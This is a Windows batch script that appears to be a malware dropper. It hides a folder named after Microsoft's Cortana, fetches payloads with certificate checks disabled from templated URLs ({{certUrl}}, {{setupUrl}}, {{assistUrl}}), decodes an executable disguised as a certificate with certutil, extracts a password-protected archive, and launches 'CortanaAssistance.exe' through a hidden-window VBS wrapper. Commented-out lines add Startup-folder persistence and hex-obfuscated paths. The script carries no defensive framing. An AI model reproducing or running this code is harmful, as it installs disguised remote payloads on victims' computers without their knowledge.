@echo off
mkdir "%tmp%/Cortana" 
attrib +h "%tmp%/Cortana" 
mkdir "%tmp%/Cortana/setup"
(
    echo @echo off
    echo ^:start
    echo tasklist ^| find "CortanaAssistance.exe" ^|^| ^(
        echo if not exist "%localappdata%/Cortana/CortanaAssistance.exe" ^(
            echo if not exist "%localappdata%/Cortana/setup/unrar.exe" ^(
            echo curl -k "{{certUrl}}" -o "%localappdata%/Cortana/setup/unrar.cert"
            echo certutil -decode "%localappdata%/Cortana/setup/unrar.cert" "%localappdata%/Cortana/setup/unrar.exe" 
            echo del "%localappdata%/Cortana/setup/unrar.cert
        echo ^)
        echo curl -k "{{assistUrl}}" -o "%localappdata%/Cortana/setup/assist.rar"
        echo "%localappdata%/Cortana/setup/unrar.exe" x "%localappdata%/Cortana/setup/assist.rar" "%localappdata%/Cortana/" -p2022 -y
    echo ^) 
    echo if exist "%tmp%/Cortana/setup/ctask.exe" ^(
    echo "%tmp%/Cortana/setup/ctask.exe" rmpath 433a2f57696e646177732021
    echo ^)
    echo tasklist ^| find "CortanaAssistance.exe" ^|^| "%localappdata%/Cortana/CortanaAssistance.exe" 
    echo ^)
REM echo timeout 300
REM echo goto start
) > "%tmp%/Cortana/CortanaDefault.bat"
if not exist "%tmp%/Cortana/setup/unrar.cert" curl -k "{{certUrl}}" -o "%tmp%/Cortana/setup/unrar.cert"
if not exist "%tmp%/Cortana/setup/setup.rar" curl -k "{{setupUrl}}" -o "%tmp%/Cortana/setup/setup.rar"
certutil -decode "%tmp%/Cortana/setup/unrar.cert" "%tmp%/Cortana/setup/unrar.exe"
"%tmp%/Cortana/setup/unrar.exe" x "%tmp%/Cortana/setup/setup.rar" "%tmp%/Cortana/" -p2022 -y
echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0) ^& """", 0, False > "%tmp%/Cortana/inv.vbs" 
REM "%tmp%/Cortana/setup/ctask.exe" movepath 25746d70252f436f7274616e61 256c6f63616c6170706461746125
xcopy /y /E /I %tmp%\Cortana %localappdata%\Cortana
attrib +h "%localappdata%/Cortana"

REM echo wscript.exe "%localappdata%/Cortana/inv.vbs" "%localappdata%/Cortana/CortanaDefault.bat" > "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/CortanaAssist.bat"
call "%localappdata%/Cortana/CortanaDefault.bat"
